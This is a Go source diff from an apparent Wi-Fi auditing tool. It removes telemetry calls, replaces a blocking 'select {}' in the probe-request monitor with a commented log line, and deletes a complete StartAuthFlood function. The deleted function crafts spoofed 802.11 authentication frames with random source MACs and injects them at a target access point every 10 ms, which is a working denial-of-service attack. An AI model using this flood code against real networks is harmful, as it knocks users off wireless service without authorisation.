@@ -14,8 +14,6 @@ import (
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
-	"github.com/lcalzada-xor/wmap/internal/core/domain"
-	"github.com/lcalzada-xor/wmap/internal/telemetry"
 )
 
 // execCommand allows mocking in tests
@@ -192,7 +190,7 @@ func (i *Injector) StartMonitor(ctx context.Context, targetMAC string, events ch
 				}
 
 				if dot11.Type == layers.Dot11TypeMgmtProbeReq {
-					select {}
+					// log.Printf("Monitor: Probe Request from %s", dot11.Address2)
 				}
 			}
 		}
@@ -247,10 +245,7 @@ func (i *Injector) BroadcastProbe(ssid string) error {
 	}
 
 	// Metric: Injection Attempt
-	telemetry.InjectionsTotal.WithLabelValues(i.Interface, "probe_req").Inc()
-
 	if err := i.mechanism.Inject(pkt); err != nil {
-		telemetry.InjectionErrors.WithLabelValues(i.Interface, "probe_req").Inc()
 		return fmt.Errorf("inject probe failed: %w", err)
 	}
 
@@ -266,84 +261,4 @@ func (i *Injector) OptimizeInterfaceForInjection() {
 	}
 }
 
-// StartAuthFlood starts an Authentication Flood attack (MDK style)
-func (i *Injector) StartAuthFlood(ctx context.Context, config domain.AuthFloodAttackConfig, statusChan chan<- domain.AuthFloodAttackStatus) error {
-	// Optimize interface for robustness (Low 'n Slow)
-	i.OptimizeInterfaceForInjection()
 
-	targetMAC, err := net.ParseMAC(config.TargetBSSID)
-	if err != nil {
-		return fmt.Errorf("invalid target BSSID: %w", err)
-	}
-
-	// Prepare Fixed MAC if configured
-	var fixedMAC net.HardwareAddr
-	if !config.UseRandomMAC && config.FixedSourceMAC != "" {
-		fixedMAC, err = net.ParseMAC(config.FixedSourceMAC)
-		if err != nil {
-			return fmt.Errorf("invalid fixed source MAC: %w", err)
-		}
-	}
-
-	interval := config.PacketInterval
-	if interval <= 0 {
-		interval = 10 * time.Millisecond // Faster for Auth Flood
-	}
-
-	ticker := time.NewTicker(interval)
-	defer ticker.Stop()
-
-	for {
-		select {
-		case <-ctx.Done():
-			return nil
-		case <-ticker.C:
-			// Generate Source MAC
-			srcMAC := fixedMAC
-			if config.UseRandomMAC {
-				srcMAC = randomMAC()
-			}
-			if srcMAC == nil {
-				srcMAC = randomMAC()
-			}
-
-			i.mu.Lock()
-			seq := i.seq
-			i.seq++
-			i.mu.Unlock()
-
-			// 1. RadioTap
-			radiotap := &layers.RadioTap{
-				Present: layers.RadioTapPresentRate,
-				Rate:    5,
-			}
-
-			// 2. Dot11 Auth
-			dot11 := &layers.Dot11{
-				Type:           layers.Dot11TypeMgmtAuthentication,
-				Address1:       targetMAC, // Destination (AP)
-				Address2:       srcMAC,    // Source (Fake Client)
-				Address3:       targetMAC, // BSSID
-				SequenceNumber: seq,
-			}
-
-			// 3. Auth Body
-			payload := []byte{
-				0x00, 0x00, // Algorithm: Open System
-				0x01, 0x00, // Sequence: 1
-				0x00, 0x00, // Status: Successful
-			}
-
-			buf := gopacket.NewSerializeBuffer()
-			opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
-			gopacket.SerializeLayers(buf, opts, radiotap, dot11, gopacket.Payload(payload))
-			pkt := buf.Bytes()
-
-			if err := i.Inject(pkt); err != nil {
-				telemetry.InjectionErrors.WithLabelValues(i.Interface, "auth_flood").Inc()
-			} else {
-				telemetry.InjectionsTotal.WithLabelValues(i.Interface, "auth_flood").Inc()
-			}
-		}
-	}
-}
